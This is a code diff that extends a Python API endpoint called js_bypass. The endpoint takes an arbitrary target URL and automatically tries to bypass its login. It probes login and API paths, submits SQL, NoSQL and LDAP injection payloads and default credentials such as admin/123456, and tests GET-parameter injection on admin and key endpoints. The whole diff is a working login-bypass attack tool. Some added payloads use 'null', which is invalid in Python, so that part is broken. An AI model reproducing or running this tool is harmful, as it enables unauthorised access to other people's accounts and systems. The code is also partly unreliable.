@@ -1535,20 +1535,29 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
     results = {"target": url, "bypassed": [], "bypassed_count": 0, "method": None}
 
     session = requests.Session()
-    session.headers.update({"User-Agent": "Mozilla/5.0"})
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/json"
+    })
 
-    # Common login paths
-    login_paths = ["/login", "/signin", "/login.php", "/signin.php",
-                   "/user/login", "/account/login", "/auth/login"]
+    # More comprehensive login paths
+    login_paths = [
+        "/login", "/signin", "/login.php", "/signin.php",
+        "/user/login", "/account/login", "/auth/login", "/auth",
+        "/oauth/login", "/oauth/token", "/authenticate", "/session"
+    ]
 
-    # API endpoints
+    # API endpoints (including GraphQL)
     api_endpoints = [
         "/api/login", "/api/auth", "/api/v1/login", "/api/user/login",
         "/rest/user/login", "/auth/login", "/user/login", "/login.json",
-        "/api/authenticate", "/api/session", "/auth/local", "/api/account/login"
+        "/api/authenticate", "/api/session", "/auth/local", "/api/account/login",
+        "/graphql", "/api/graphql", "/v1/graphql"
     ]
 
-    # Payloads
+    # Payloads: SQLi, NoSQL, LDAP, Default creds
     json_payloads = [
         {"username": "' OR '1'='1", "password": "' OR '1'='1"},
         {"email": "' OR '1'='1", "password": "' OR '1'='1"},
@@ -1564,8 +1573,15 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
         {"email": "admin", "password": "123456"},
         {"username": "root", "password": "root"},
         {"username": "test", "password": "test"},
+        # NoSQL injection
+        {"username": {"$ne": null}, "password": {"$ne": null}},
+        {"email": {"$ne": null}, "password": {"$ne": null}},
+        # LDAP injection
+        {"username": "*)(uid=*))(|(uid=*", "password": "*)(uid=*))(|(uid=*"},
+        {"email": "*)(uid=*))(|(uid=*", "password": "*)(uid=*))(|(uid=*"},
     ]
 
+    # Also try form-urlencoded payloads for API endpoints that expect form data
     form_payloads = [
         {"username": "' OR '1'='1", "password": "' OR '1'='1"},
         {"email": "' OR '1'='1", "password": "' OR '1'='1"},
@@ -1579,7 +1595,7 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
         try:
             r = session.post(form_url, data=data, timeout=5, allow_redirects=True)
             body = r.text.lower()
-            return any(s in body for s in ["welcome", "dashboard", "logout", "profile", "success"])
+            return any(s in body for s in ["welcome", "dashboard", "logout", "profile", "success", "token", "session"])
         except:
             return False
 
@@ -1589,16 +1605,16 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
             if r.status_code in [200, 302]:
                 try:
                     resp_json = r.json()
-                    if "token" in resp_json or "success" in resp_json or "user" in resp_json:
+                    if "token" in resp_json or "success" in resp_json or "user" in resp_json or "session" in resp_json:
                         return True
                 except:
-                    if "welcome" in r.text.lower() or "dashboard" in r.text.lower():
+                    if "welcome" in r.text.lower() or "dashboard" in r.text.lower() or "token" in r.text.lower():
                         return True
         except:
             pass
         return False
 
-    # Step 1: Given URL directly
+    # ----- Step 1: Given URL directly -----
     try:
         res = session.get(url, timeout=10)
         soup = BeautifulSoup(res.text, "html.parser")
@@ -1617,12 +1633,21 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
                 user_field = next((k for k in data if any(x in k.lower() for x in ["user", "email", "login"])), None)
                 pass_field = next((k for k in data if any(x in k.lower() for x in ["pass", "pwd", "password"])), None)
                 if user_field and pass_field:
-                    for username, password in json_payloads[:10]:
+                    for payload in json_payloads[:10]:
                         test_data = data.copy()
-                        test_data[user_field] = username
-                        test_data[pass_field] = password
+                        # payload may be dict with username/email or other keys
+                        if "username" in payload:
+                            test_data[user_field] = payload["username"]
+                        elif "email" in payload:
+                            test_data[user_field] = payload["email"]
+                        else:
+                            continue
+                        if "password" in payload:
+                            test_data[pass_field] = payload["password"]
+                        else:
+                            continue
                         if try_login_form(action, test_data):
-                            results["bypassed"].append({"username": username, "password": password, "method": "html_form"})
+                            results["bypassed"].append({"payload": payload, "method": "html_form"})
                             results["bypassed_count"] = 1
                             results["method"] = "html_form"
                             break
@@ -1631,7 +1656,7 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
     except:
         pass
 
-    # Step 2: Try common login paths
+    # ----- Step 2: Try common login paths -----
     if not results["bypassed"]:
         parsed = urlparse(url)
         base = f"{parsed.scheme}://{parsed.netloc}"
@@ -1656,12 +1681,20 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
                     user_field = next((k for k in data if any(x in k.lower() for x in ["user", "email", "login"])), None)
                     pass_field = next((k for k in data if any(x in k.lower() for x in ["pass", "pwd", "password"])), None)
                     if user_field and pass_field:
-                        for username, password in json_payloads[:10]:
+                        for payload in json_payloads[:10]:
                             test_data = data.copy()
-                            test_data[user_field] = username
-                            test_data[pass_field] = password
+                            if "username" in payload:
+                                test_data[user_field] = payload["username"]
+                            elif "email" in payload:
+                                test_data[user_field] = payload["email"]
+                            else:
+                                continue
+                            if "password" in payload:
+                                test_data[pass_field] = payload["password"]
+                            else:
+                                continue
                             if try_login_form(action, test_data):
-                                results["bypassed"].append({"username": username, "password": password, "method": f"html_form_{path}"})
+                                results["bypassed"].append({"payload": payload, "method": f"html_form_{path}"})
                                 results["bypassed_count"] = 1
                                 results["method"] = f"html_form_{path}"
                                 break
@@ -1670,12 +1703,13 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
             except:
                 continue
 
-    # Step 3: API endpoints
+    # ----- Step 3: Try API endpoints (JSON and form) -----
     if not results["bypassed"]:
         parsed = urlparse(url)
         base = f"{parsed.scheme}://{parsed.netloc}"
         for endpoint in api_endpoints:
             api_url = urljoin(base, endpoint)
+            # Try JSON POST
             for payload in json_payloads:
                 if try_json_endpoint(api_url, payload):
                     results["bypassed"].append({"payload": payload, "method": f"json_{endpoint}"})
@@ -1684,10 +1718,11 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
                     break
             if results["bypassed"]:
                 break
+            # Try form-encoded POST
             for payload in form_payloads:
                 try:
                     r = session.post(api_url, data=payload, timeout=5)
-                    if r.status_code in [200, 302] and ("welcome" in r.text.lower() or "dashboard" in r.text.lower()):
+                    if r.status_code in [200, 302] and ("welcome" in r.text.lower() or "dashboard" in r.text.lower() or "token" in r.text.lower()):
                         results["bypassed"].append({"payload": payload, "method": f"form_{endpoint}"})
                         results["bypassed_count"] = 1
                         results["method"] = "form_api"
@@ -1697,11 +1732,11 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
             if results["bypassed"]:
                 break
 
-    # Step 4: GET injection on API endpoints
+    # ----- Step 4: Try GET injection on API endpoints -----
     if not results["bypassed"]:
-        for endpoint in ["/api/users", "/api/admin", "/api/keys"]:
+        for endpoint in ["/api/users", "/api/admin", "/api/keys", "/graphql", "/api/graphql"]:
             test_url = urljoin(base, endpoint)
-            for param in ["username", "email", "id"]:
+            for param in ["username", "email", "id", "user"]:
                 payload = f"?{param}=' OR '1'='1"
                 try:
                     r = session.get(test_url + payload, timeout=5)
